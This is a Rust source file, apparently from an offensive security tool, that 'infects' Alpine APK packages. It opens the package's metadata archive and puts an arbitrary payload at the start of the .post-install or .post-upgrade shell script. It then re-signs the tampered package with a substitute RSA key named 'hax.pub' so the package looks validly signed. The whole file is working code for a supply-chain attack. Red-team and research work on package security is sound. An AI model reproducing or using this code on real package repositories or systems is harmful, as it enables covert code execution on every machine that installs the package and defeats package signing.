use crate::args;
use crate::errors::*;
use flate2::bufread::GzDecoder;
use flate2::write::GzEncoder;
use flate2::GzBuilder;
use openssl::hash::MessageDigest;
use openssl::pkey;
use openssl::pkey::PKey;
use openssl::sign::Signer;
use std::io;
use std::io::prelude::*;
use std::io::BufReader;
use std::io::Read;
use tar::Archive;

pub fn read_gzip_to_end<R: BufRead>(reader: &mut R) -> Result<Vec<u8>> {
    let mut buf = Vec::new();
    let mut gz = GzDecoder::new(reader);
    gz.read_to_end(&mut buf)?;
    Ok(buf)
}

pub fn make_gz_encoder<W: Write>(w: W) -> GzEncoder<W> {
    GzBuilder::new()
        // .operating_system(3) // Unix
        .write(w, flate2::Compression::best())
}

pub fn write_compressed<R: Read, W: Write>(r: &mut R, w: &mut W) -> Result<()> {
    let mut gz = make_gz_encoder(w);
    io::copy(r, &mut gz)?;
    gz.finish()?;
    Ok(())
}

pub fn patch_signature_buf(signature_buf: &[u8], pkg: &[u8]) -> Result<Vec<u8>> {
    let mut out = Vec::new();
    let mut builder = tar::Builder::new(&mut out);
    let mut archive = Archive::new(signature_buf);

    // Load signing key
    let buf = std::fs::read("alpine.sec").context("Failed to read signing key")?;
    let keypair = PKey::private_key_from_pem(&buf).context("Failed to load signing key")?;
    let key_algo_id = match keypair.id() {
        pkey::Id::RSA => "RSA",
        _ => "XXX",
    };

    // Sign the data
    let mut signer =
        Signer::new(MessageDigest::sha1(), &keypair).context("Failed to setup signer")?;
    signer.update(pkg).context("Failed to hash package")?;
    let signature = signer.sign_to_vec().context("Failed to sign package")?;

    debug!(
        "Generated signature ({} bytes): {:?}",
        signature.len(),
        signature
    );

    for entry in archive.entries()? {
        let mut entry = entry?;
        let mut header = entry.header().clone();
        debug!("Found entry in tar: {:?}", header.path());

        let mut buf = Vec::new();
        entry.read_to_end(&mut buf)?;

        debug!("Replacing signature ({} bytes): {:?}", buf.len(), buf);
        let name = format!(".SIGN.{}.{}", key_algo_id, "hax.pub");
        debug!("Changing entry name from {:?} to {:?}", entry.path(), name);
        header.set_path(name)?;
        header.set_size(signature.len() as u64);
        header.set_cksum();
        builder.append(&header, &mut &signature[..])?;
    }
    builder.into_inner()?;

    debug!("Stripping the tar termination section (1024 zero bytes)");
    out.truncate(out.len() - 1024);

    Ok(out)
}

pub fn patch_metadata_buf(args: &args::InfectApkPkg, buf: &[u8]) -> Result<Vec<u8>> {
    let mut out = Vec::new();
    let mut builder = tar::Builder::new(&mut out);
    let mut archive = Archive::new(buf);
    for entry in archive.entries()?.raw(true) {
        let mut entry = entry?;
        let mut header = entry.header().clone();
        debug!("Found entry in tar: {:?}", header.path());
        let path = header.path()?;
        let filename = path
            .to_str()
            .with_context(|| anyhow!("Package contains paths with invalid encoding: {:?}", path))?;

        match filename {
            ".post-install" | ".post-upgrade" => {
                let mut script = String::new();
                entry.read_to_string(&mut script)?;
                debug!("Found existing hook for {:?}: {:?}", filename, script);

                if !script.starts_with("#!/bin/sh") {
                    bail!("Can't infect this type of post install script");
                }

                let script = format!("#!/bin/sh\n{}\n{}", args.payload, script);

                let buf = script.as_bytes();
                header.set_size(buf.len() as u64);
                header.set_cksum();
                builder.append(&header, &mut &buf[..])?;
            }
            _ => {
                builder.append(&header, &mut entry)?;
            }
        }
    }
    builder.into_inner()?;

    debug!("Stripping the tar termination section (1024 zero bytes)");
    out.truncate(out.len() - 1024);

    Ok(out)
}

pub fn infect(args: &args::InfectApkPkg, pkg: &[u8]) -> Result<Vec<u8>> {
    let mut reader = BufReader::new(pkg);

    debug!("Reading compressed signature buffer...");
    let signature_buf = read_gzip_to_end(&mut reader)?;

    let mut pkg = Vec::new();
    debug!("Reading compressed metadata buffer...");
    let metadata_buf = read_gzip_to_end(&mut reader)?;
    let metadata_buf = patch_metadata_buf(args, &metadata_buf)?;
    write_compressed(&mut &metadata_buf[..], &mut pkg)?;

    debug!("Patching signature...");
    let signature_buf = patch_signature_buf(&signature_buf, &pkg)?;

    debug!("Streaming remaining package contents...");
    let n = io::copy(&mut reader, &mut pkg)?;
    debug!("Forwarded {} bytes", n);

    let mut out = Vec::new();
    write_compressed(&mut &signature_buf[..], &mut out)?;
    io::copy(&mut &pkg[..], &mut out)?;

    Ok(out)
}
